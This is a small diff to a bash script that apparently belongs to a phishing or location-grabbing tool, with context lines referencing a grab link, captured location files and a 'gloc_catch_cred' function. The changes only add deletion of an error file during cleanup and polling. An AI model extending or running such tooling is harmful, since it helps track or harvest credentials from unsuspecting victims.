@@ -37,6 +37,9 @@ fi
 if [[ -e .grablink ]]; then
 rm -rf .grablink
 fi
+if [[ -e .server/location/error.txt ]]; then
+rm -rf .server/location/error.txt
+fi
 
 }
 
@@ -239,6 +242,10 @@ printf "  \e[0m\e[1;93m  ASN           \e[0m\e[1;96m:\e[0m\e[1;92m   $userasn\e[
 printf "\e[0m\n"
 
 while [ true ]; do
+
+if [[ -e .server/location/error.txt ]]; then
+rm -rf .server/location/error.txt
+fi
 
 if [[ -e ".server/location/location.txt" ]]; then
 gloc_catch_cred
